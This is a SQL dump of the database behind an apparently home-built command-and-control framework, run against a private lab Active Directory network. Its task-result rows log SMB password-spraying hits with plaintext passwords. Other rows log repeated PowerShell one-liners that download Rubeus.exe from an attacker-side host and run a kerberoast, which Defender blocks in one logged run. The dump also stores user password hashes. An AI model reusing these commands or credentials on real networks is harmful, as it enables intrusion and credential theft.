-- phpMyAdmin SQL Dump
-- version 5.2.0
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Jul 05, 2023 at 06:28 PM
-- Server version: 10.4.25-MariaDB
-- PHP Version: 8.1.10

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `hackerproject`
--

-- --------------------------------------------------------

--
-- Table structure for table `auth_group`
--

CREATE TABLE `auth_group` (
  `id` int(11) NOT NULL,
  `name` varchar(150) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `auth_group_permissions`
--

CREATE TABLE `auth_group_permissions` (
  `id` bigint(20) NOT NULL,
  `group_id` int(11) NOT NULL,
  `permission_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `auth_permission`
--

CREATE TABLE `auth_permission` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `content_type_id` int(11) NOT NULL,
  `codename` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `auth_permission`
--

INSERT INTO `auth_permission` (`id`, `name`, `content_type_id`, `codename`) VALUES
(1, 'Can add log entry', 1, 'add_logentry'),
(2, 'Can change log entry', 1, 'change_logentry'),
(3, 'Can delete log entry', 1, 'delete_logentry'),
(4, 'Can view log entry', 1, 'view_logentry'),
(5, 'Can add users', 2, 'add_users'),
(6, 'Can change users', 2, 'change_users'),
(7, 'Can delete users', 2, 'delete_users'),
(8, 'Can view users', 2, 'view_users'),
(9, 'Can add permission', 3, 'add_permission'),
(10, 'Can change permission', 3, 'change_permission'),
(11, 'Can delete permission', 3, 'delete_permission'),
(12, 'Can view permission', 3, 'view_permission'),
(13, 'Can add group', 4, 'add_group'),
(14, 'Can change group', 4, 'change_group'),
(15, 'Can delete group', 4, 'delete_group'),
(16, 'Can view group', 4, 'view_group'),
(17, 'Can add user', 5, 'add_user'),
(18, 'Can change user', 5, 'change_user'),
(19, 'Can delete user', 5, 'delete_user'),
(20, 'Can view user', 5, 'view_user'),
(21, 'Can add content type', 6, 'add_contenttype'),
(22, 'Can change content type', 6, 'change_contenttype'),
(23, 'Can delete content type', 6, 'delete_contenttype'),
(24, 'Can view content type', 6, 'view_contenttype'),
(25, 'Can add listener form', 7, 'add_listenerform'),
(26, 'Can change listener form', 7, 'change_listenerform'),
(27, 'Can delete listener form', 7, 'delete_listenerform'),
(28, 'Can view listener form', 7, 'view_listenerform'),
(29, 'Can add agent', 8, 'add_agent'),
(30, 'Can change agent', 8, 'change_agent'),
(31, 'Can delete agent', 8, 'delete_agent'),
(32, 'Can view agent', 8, 'view_agent'),
(33, 'Can add session', 9, 'add_session'),
(34, 'Can change session', 9, 'change_session'),
(35, 'Can delete session', 9, 'delete_session'),
(36, 'Can view session', 9, 'view_session'),
(37, 'Can add modules', 10, 'add_modules'),
(38, 'Can change modules', 10, 'change_modules'),
(39, 'Can delete modules', 10, 'delete_modules'),
(40, 'Can view modules', 10, 'view_modules'),
(41, 'Can add agent tasks', 11, 'add_agenttasks'),
(42, 'Can change agent tasks', 11, 'change_agenttasks'),
(43, 'Can delete agent tasks', 11, 'delete_agenttasks'),
(44, 'Can view agent tasks', 11, 'view_agenttasks');

-- --------------------------------------------------------

--
-- Table structure for table `auth_user`
--

CREATE TABLE `auth_user` (
  `id` int(11) NOT NULL,
  `password` varchar(128) NOT NULL,
  `last_login` datetime(6) DEFAULT NULL,
  `is_superuser` tinyint(1) NOT NULL,
  `username` varchar(150) NOT NULL,
  `first_name` varchar(150) NOT NULL,
  `last_name` varchar(150) NOT NULL,
  `email` varchar(254) NOT NULL,
  `is_staff` tinyint(1) NOT NULL,
  `is_active` tinyint(1) NOT NULL,
  `date_joined` datetime(6) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `auth_user`
--

INSERT INTO `auth_user` (`id`, `password`, `last_login`, `is_superuser`, `username`, `first_name`, `last_name`, `email`, `is_staff`, `is_active`, `date_joined`) VALUES
(1, 'pbkdf2_sha256$260000$lW24ZRCnjHBRfl5nMlpZsm$WPOQFyPCT1pf0cxWq9Me65NlqkAkZ8E9u8z9pwfFqCE=', '2023-05-17 14:24:39.140853', 1, 'admin', '', '', 'admin@gmail.com', 1, 1, '2022-10-20 10:10:02.435570'),
(2, 'pbkdf2_sha256$390000$VcJyCcXjTw3BLzdoAFOs4l$vzeQ5BNSBrTDnreTIz0Ivyaf8+BHyD0XtSvRGsb8M80=', '2022-10-21 18:01:51.788209', 1, 'tamer', '', '', 'tamer@gmail.com', 1, 1, '2022-10-21 18:00:11.000000'),
(3, 'pbkdf2_sha256$390000$rBKtztMUtF8v2WViZlwh44$xM7mHlGyOQe+JHSXq2wLKha8Woj7XOpOR4D2aj+zJGY=', NULL, 0, 'rana', '', '', 'rana@gmail.com', 0, 1, '2022-10-21 18:41:06.000000'),
(4, 'pbkdf2_sha256$260000$jV5L1tD0CutfiRzuXnPMFF$pKxOqqYj3GGTCfGPy1x/vGGaXE+cOeeRsTU21CbGNQU=', '2023-03-12 12:54:18.904657', 0, 'hawary', '', '', 'asdjavsliasugfpaispui@gmail.com', 0, 1, '2023-03-12 12:53:25.017954');

-- --------------------------------------------------------

--
-- Table structure for table `auth_user_groups`
--

CREATE TABLE `auth_user_groups` (
  `id` bigint(20) NOT NULL,
  `user_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `auth_user_user_permissions`
--

CREATE TABLE `auth_user_user_permissions` (
  `id` bigint(20) NOT NULL,
  `user_id` int(11) NOT NULL,
  `permission_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `blog_agent`
--

CREATE TABLE `blog_agent` (
  `id` bigint(20) NOT NULL,
  `name` varchar(100) NOT NULL,
  `ip` varchar(100) NOT NULL,
  `hname` varchar(100) NOT NULL,
  `created_date` datetime(6) NOT NULL,
  `updated_date` date NOT NULL,
  `username` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `blog_agent`
--

INSERT INTO `blog_agent` (`id`, `name`, `ip`, `hname`, `created_date`, `updated_date`, `username`) VALUES
(10, 'Windows_GENERAL', 'local', 'General for Black-Box', '2023-03-06 00:09:22.493603', '2023-03-06', 'Windows_GENERAL'),
(12, 'Linux_GENERAL', 'local', 'General for Black-Box', '2023-03-10 23:28:29.335502', '2023-03-11', 'Linux_GENERAL'),
(13, 'AD_GENERAL', 'local', 'General for Black-Box', '2023-05-14 00:31:00.787314', '2023-05-14', 'AD_GENERAL'),
(14, 'JXTIEW', '192.168.116.187', 'win10', '2023-05-15 22:27:25.768325', '2023-05-16', 'normal\\hasan'),
(15, 'AYBCII', '192.168.116.184', 'LAB-DC-01', '2023-05-16 11:14:19.901915', '2023-05-16', 'normal\\administrator');

-- --------------------------------------------------------

--
-- Table structure for table `blog_agenttasks`
--

CREATE TABLE `blog_agenttasks` (
  `id` bigint(20) NOT NULL,
  `created_date` datetime(6) NOT NULL,
  `agent_id` bigint(20) NOT NULL,
  `module_id` bigint(20) NOT NULL,
  `task_result` longtext DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `blog_agenttasks`
--

INSERT INTO `blog_agenttasks` (`id`, `created_date`, `agent_id`, `module_id`, `task_result`, `user_id`) VALUES
(209, '2023-05-15 15:54:07.274683', 13, 111, 'OutPut in the following path:\n/root/Desktop/c2Https-motest/blog/Modules/ActiveDirectory/../../data/listeners/agents/AD_GENERAL/', 1),
(210, '2023-05-15 15:55:11.661271', 13, 112, 'SMB         192.168.116.181 445    LAB-DC-01        [+] Normal.users\\ahmed:P@ssw0rd \n', 1),
(211, '2023-05-15 17:00:07.791445', 13, 113, NULL, 1),
(212, '2023-05-15 19:28:33.815728', 13, 115, NULL, 1),
(213, '2023-05-15 20:14:32.716297', 13, 112, '', 1),
(214, '2023-05-15 20:15:53.277427', 13, 112, 'SMB         192.168.116.181 445    LAB-DC-01        [+] Normal.users\\john:champion=1993 (Pwn3d!)\n', 1),
(215, '2023-05-15 21:14:30.571133', 13, 115, NULL, 1),
(216, '2023-05-15 21:15:55.522774', 13, 115, NULL, 1),
(217, '2023-05-15 21:19:28.477857', 13, 113, NULL, 1),
(218, '2023-05-15 21:19:36.751979', 13, 113, NULL, 1),
(219, '2023-05-15 21:20:00.146827', 13, 113, NULL, 1),
(220, '2023-05-15 21:20:20.938716', 13, 113, NULL, 1),
(221, '2023-05-15 21:21:55.820928', 13, 113, NULL, 1),
(222, '2023-05-15 21:22:06.396605', 13, 113, NULL, 1),
(223, '2023-05-15 21:26:51.196095', 13, 113, NULL, 1),
(224, '2023-05-15 22:45:20.940623', 14, 122, NULL, 1),
(225, '2023-05-15 22:47:05.433631', 14, 122, NULL, 1),
(226, '2023-05-15 22:48:07.108578', 14, 122, NULL, 1),
(227, '2023-05-15 22:48:54.688387', 14, 122, NULL, 1),
(228, '2023-05-15 22:49:34.830232', 14, 122, NULL, 1),
(229, '2023-05-15 22:49:50.727191', 14, 122, NULL, 1),
(230, '2023-05-15 22:50:52.966628', 14, 122, NULL, 1),
(231, '2023-05-15 22:52:06.100716', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets=============== Exception calling \"DownloadFile\" with \"2\" argument(s): \"An exception occurred during a WebClient request.\"\r\nAt line:1 char:61\r\n+ ... ===========;(New-Object Net.WebClient).DownloadFile(\'http://192.168.1 ...\r\n+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : WebException\r\n \r\nrubeus.exe : The term \'rubeus.exe\' is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:1 char:192\r\n+ ... , \'c:/users/hasan/rubeus.exe\');cd $env:userprofile;rubeus.exe kerbero ...\r\n+                                                        ~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException', 1),
(232, '2023-05-15 22:53:09.130982', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets=============== Exception calling \"DownloadFile\" with \"2\" argument(s): \"An exception occurred during a WebClient request.\"\r\nAt line:1 char:61\r\n+ ... ===========;(New-Object Net.WebClient).DownloadFile(\'http://192.168.1 ...\r\n+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : WebException\r\n \r\nrubeus.exe : The term \'rubeus.exe\' is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:2 char:33\r\n+ ubeus.exe\');cd $env:userprofile;rubeus.exe kerberoast /user:john /now ...\r\n+                                 ~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException', 1),
(233, '2023-05-15 22:54:03.326045', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets=============== Exception calling \"DownloadFile\" with \"2\" argument(s): \"An exception occurred during a WebClient request.\"\r\nAt line:1 char:61\r\n+ ... ===========;(New-Object Net.WebClient).DownloadFile(\'http://192.168.1 ...\r\n+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : WebException\r\n \r\nrubeus.exe : The term \'rubeus.exe\' is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:2 char:33\r\n+ ubeus.exe\');cd $env:userprofile;rubeus.exe kerberoast /user:john /now ...\r\n+                                 ~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException', 1),
(234, '2023-05-15 22:57:00.719387', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets=============== Exception calling \"DownloadFile\" with \"2\" argument(s): \"An exception occurred during a WebClient request.\"\r\nAt line:1 char:61\r\n+ ... ===========;(New-Object Net.WebClient).DownloadFile(\'http://192.168.1 ...\r\n+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : WebException\r\n \r\nrubeus.exe : The term \'rubeus.exe\' is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:1 char:204\r\n+ ... profile\\Documents/rubeus.exe\');cd $env:userprofile;rubeus.exe kerbero ...\r\n+                                                        ~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException', 1),
(235, '2023-05-15 22:59:23.463111', 14, 122, ' At line:1 char:101\r\n+ ... ckets===============;(New-Object Net.WebClient).DownloadFile(http://1 ...\r\n+                                                                  ~\r\nMissing \')\' in method call.\r\nAt line:1 char:101\r\n+ ... ebClient).DownloadFile(http://192.168.116.129:8888/Rubeus.exe, $env:u ...\r\n+                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nUnexpected token \'http://192.168.116.129:8888/Rubeus.exe\' in expression or statement.\r\nAt line:1 char:139\r\n+ ... bClient).DownloadFile(http://192.168.116.129:8888/Rubeus.exe, $env:us ...\r\n+                                                                 ~\r\nMissing argument in parameter list.\r\nAt line:1 char:178\r\n+ ... 6.129:8888/Rubeus.exe, $env:userprofile\\Documents/rubeus.exe);cd $env ...\r\n+                                                                 ~\r\nUnexpected token \')\' in expression or statement.\r\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\r\n    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall', 1),
(236, '2023-05-15 23:03:57.087404', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets=============== Exception calling \"DownloadFile\" with \"2\" argument(s): \"An exception occurred during a WebClient request.\"\r\nAt line:1 char:61\r\n+ ... ===========;(New-Object Net.WebClient).DownloadFile(\'http://192.168.1 ...\r\n+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : WebException\r\n \r\nrubeus.exe : The term \'rubeus.exe\' is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:1 char:214\r\n+ ... cuments/rubeus.exe\');cd $env:userprofile\\documents;rubeus.exe kerbero ...\r\n+                                                        ~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException', 1),
(237, '2023-05-15 23:05:40.298670', 14, 122, NULL, 1),
(238, '2023-05-15 23:06:38.077318', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets=============== Exception calling \"DownloadFile\" with \"2\" argument(s): \"An exception occurred during a WebClient request.\"\r\nAt line:1 char:61\r\n+ ... ===========;(New-Object Net.WebClient).DownloadFile(\'http://192.168.1 ...\r\n+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : WebException\r\n \r\nrubeus.exe : The term \'rubeus.exe\' is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:2 char:43\r\n+ ubeus.exe\');cd $env:userprofile\\documents;rubeus.exe kerberoast /user ...\r\n+                                           ~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException', 1),
(239, '2023-05-15 23:07:50.100537', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets=============== Exception calling \"DownloadFile\" with \"2\" argument(s): \"An exception occurred during a WebClient request.\"\r\nAt line:1 char:61\r\n+ ... ===========;(New-Object Net.WebClient).DownloadFile(\'http://192.168.1 ...\r\n+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : WebException\r\n \r\nrubeus.exe : The term \'rubeus.exe\' is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:2 char:43\r\n+ ubeus.exe\');cd $env:userprofile\\documents;rubeus.exe kerberoast /user ...\r\n+                                           ~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException', 1),
(240, '2023-05-15 23:19:19.931444', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets=============== Exception calling \"DownloadFile\" with \"2\" argument(s): \"An exception occurred during a WebClient request.\"\r\nAt line:1 char:61\r\n+ ... ===========;(New-Object Net.WebClient).DownloadFile(\'http://192.168.1 ...\r\n+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : WebException\r\n \r\nrubeus.exe : The term \'rubeus.exe\' is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:2 char:43\r\n+ ubeus.exe\');cd $env:userprofile\\documents;rubeus.exe kerberoast /user ...\r\n+                                           ~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException', 1),
(241, '2023-05-15 23:19:55.893484', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets=============== Exception calling \"DownloadFile\" with \"2\" argument(s): \"An exception occurred during a WebClient request.\"\r\nAt line:1 char:61\r\n+ ... ===========;(New-Object Net.WebClient).DownloadFile(\'http://192.168.1 ...\r\n+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : WebException\r\n \r\nrubeus.exe : The term \'rubeus.exe\' is not recognized as the name of a cmdlet, function, script file, or operable \r\nAt line:2 char:43\r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\n+ ubeus.exe\');cd $env:userprofile\\documents;rubeus.exe kerberoast /user ...\r\n+                                           ~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException', 1),
(242, '2023-05-15 23:22:48.434412', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets=============== Exception calling \"DownloadFile\" with \"2\" argument(s): \"An exception occurred during a WebClient request.\"\r\nAt line:1 char:61\r\n+ ... ===========;(New-Object Net.WebClient).DownloadFile(\'http://192.168.1 ...\r\n+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : WebException\r\n \r\nrubeus.exe : The term \'rubeus.exe\' is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:2 char:43\r\n+ ubeus.exe\');cd $env:userprofile\\documents;rubeus.exe kerberoast /user ...\r\n+                                           ~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException', 1),
(243, '2023-05-15 23:23:34.623133', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets=============== Exception calling \"DownloadFile\" with \"2\" argument(s): \"An exception occurred during a WebClient request.\"\r\nAt line:1 char:61\r\n+ ... ===========;(New-Object Net.WebClient).DownloadFile(\'http://192.168.1 ...\r\n+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : WebException\r\n \r\nrubeus.exe : The term \'rubeus.exe\' is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:2 char:43\r\n+ ubeus.exe\');cd $env:userprofile\\documents;rubeus.exe kerberoast /user ...\r\n+                                           ~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException', 1),
(244, '2023-05-15 23:25:00.550827', 14, 122, ' At line:1 char:160\r\n+ ... e(\'http://192.168.116.129:8888/Rubeus.exe\', $env:userprofile+\\Documen ...\r\n+                                                                  ~\r\nYou must provide a value expression following the \'+\' operator.\r\nAt line:1 char:160\r\n+ ... e(\'http://192.168.116.129:8888/Rubeus.exe\', $env:userprofile+\\Documen ...\r\n+                                                                  ~\r\nMissing \')\' in method call.\r\nAt line:1 char:160\r\n+ ... .129:8888/Rubeus.exe\', $env:userprofile+\\Documents/rubeus.exe);cd $en ...\r\n+                                             ~~~~~~~~~~~~~~~~~~~~~\r\nUnexpected token \'\\Documents/rubeus.exe\' in expression or statement.\r\nAt line:1 char:181\r\n+ ... 129:8888/Rubeus.exe\', $env:userprofile+\\Documents/rubeus.exe);cd $env ...\r\n+                                                                 ~\r\nUnexpected token \')\' in expression or statement.\r\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\r\n    + FullyQualifiedErrorId : ExpectedValueExpression', 1),
(245, '2023-05-15 23:28:23.319854', 14, 122, ' At line:1 char:159\r\n+ ... le(\'http://192.168.116.129:8888/Rubeus.exe\',$env:USERPROFILE+/Documen ...\r\n+                                                                  ~\r\nYou must provide a value expression following the \'+\' operator.\r\nAt line:1 char:160\r\n+ ... e(\'http://192.168.116.129:8888/Rubeus.exe\',$env:USERPROFILE+/Document ...\r\n+                                                                  ~\r\nYou must provide a value expression following the \'/\' operator.\r\nAt line:1 char:160\r\n+ ... e(\'http://192.168.116.129:8888/Rubeus.exe\',$env:USERPROFILE+/Document ...\r\n+                                                                  ~\r\nMissing \')\' in method call.\r\nAt line:1 char:160\r\n+ ... 6.129:8888/Rubeus.exe\',$env:USERPROFILE+/Documents/rubeus.exe);cd $en ...\r\n+                                              ~~~~~~~~~~~~~~~~~~~~\r\nUnexpected token \'Documents/rubeus.exe\' in expression or statement.\r\nAt line:1 char:180\r\n+ ... .129:8888/Rubeus.exe\',$env:USERPROFILE+/Documents/rubeus.exe);cd $env ...\r\n+                                                                 ~\r\nUnexpected token \')\' in expression or statement.\r\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\r\n    + FullyQualifiedErrorId : ExpectedValueExpression', 1),
(246, '2023-05-15 23:29:41.691474', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets=============== rubeus.exe : The term \'rubeus.exe\' is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:1 char:214\r\n+ ... cuments/rubeus.exe\');cd $env:userprofile\\documents;rubeus.exe kerbero ...\r\n+                                                        ~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException', 1),
(247, '2023-05-15 23:31:45.914696', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets=============== rubeus.exe : The term \'rubeus.exe\' is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:1 char:214\r\n+ ... cuments/rubeus.exe\');cd $env:userprofile\\documents;rubeus.exe kerbero ...\r\n+                                                        ~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (rubeus.exe:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException', 1),
(248, '2023-05-15 23:33:02.675745', 14, 122, ' At line:1 char:214\r\n+ ... :USERPROFILE+\'/Documents/rubeus.exe\');cd $env:userprofile\\documents;.\r\n+                                                                         ~\r\nMissing expression after \'.\' in pipeline element.\r\nAt line:1 char:215\r\n+ ... :USERPROFILE+\'/Documents/rubeus.exe\');cd $env:userprofile\\documents;.\r\n+                                                                          ~\r\nUnexpected token \'\r\n\' in expression or statement.\r\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\r\n    + FullyQualifiedErrorId : MissingExpression', 1),
(249, '2023-05-15 23:33:29.191080', 14, 122, ' At line:1 char:214\r\n+ ... :USERPROFILE+\'/Documents/rubeus.exe\');cd $env:userprofile\\documents;.\r\n+                                                                         ~\r\nMissing expression after \'.\' in pipeline element.\r\nAt line:1 char:215\r\n+ ... :USERPROFILE+\'/Documents/rubeus.exe\');cd $env:userprofile\\documents;.\r\n+                                                                          ~\r\nUnexpected token \'\r\n\' in expression or statement.\r\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\r\n    + FullyQualifiedErrorId : MissingExpression', 1),
(250, '2023-05-15 23:33:40.412060', 14, 122, ' At line:1 char:214\r\n+ ... :USERPROFILE+\'/Documents/rubeus.exe\');cd $env:userprofile\\documents;.\r\n+                                                                         ~\r\nMissing expression after \'.\' in pipeline element.\r\nAt line:1 char:215\r\n+ ... :USERPROFILE+\'/Documents/rubeus.exe\');cd $env:userprofile\\documents;.\r\n+                                                                          ~\r\nUnexpected token \'\r\n\' in expression or statement.\r\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\r\n    + FullyQualifiedErrorId : MissingExpression', 1),
(251, '2023-05-15 23:34:38.142593', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets=============== Program \'rubeus.exe\' failed to run: Operation did not complete successfully because the file contains a virus or \r\npotentially unwanted softwareAt line:1 char:214\r\n+ ... rofile\\documents;./rubeus.exe kerberoast /user:john /nowrap /tgtdeleg\r\n+                      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.\r\nAt line:1 char:214\r\n+ ... rofile\\documents;./rubeus.exe kerberoast /user:john /nowrap /tgtdeleg\r\n+                      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException\r\n    + FullyQualifiedErrorId : NativeCommandFailed', 1),
(252, '2023-05-15 23:36:17.020763', 14, 122, '.\r\nC2nan:#/\r\n===============TGStickets===============\r\n   ______        _                      \r\n  (_____ \\      | |                     \r\n   _____) )_   _| |__  _____ _   _  ___ \r\n  |  __  /| | | |  _ \\| ___ | | | |/___)\r\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n  |_|   |_|____/|____/|_____)____/(___/\r\n  v2.2.0 \r\n[*] Action: Kerberoasting\r\n[*] Using \'tgtdeleg\' to request a TGT for the current user\r\n[X] Error: AcquireCredentialsHandle error: -2146893042\r\n[!] Unhandled Rubeus exception:\r\nSystem.NullReferenceException: Object reference not set to an instance of an object.\r\n   at Rubeus.KRB_CRED..ctor(Byte[] bytes)\r\n   at Rubeus.Roast.Kerberoast(String spn, List`1 spns, String userName, String OUName, String domain, String dc, NetworkCredential cred, String outFile, Boolean simpleOutput, KRB_CRED TGT, Boolean useTGTdeleg, String supportedEType, String pwdSetAfter, String pwdSetBefore, String ldapFilter, Int32 resultLimit, Int32 delay, Int32 jitter, Boolean userStats, Boolean enterprise, Boolean autoenterprise, Boolean ldaps, String nopreauth)\r\n   at Rubeus.Commands.Kerberoast.Execute(Dictionary`2 arguments)\r\n   at Rubeus.Domain.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)\r\n   at Rubeus.Program.MainExecute(String commandName, Dictionary`2 parsedArgs) ', 1),
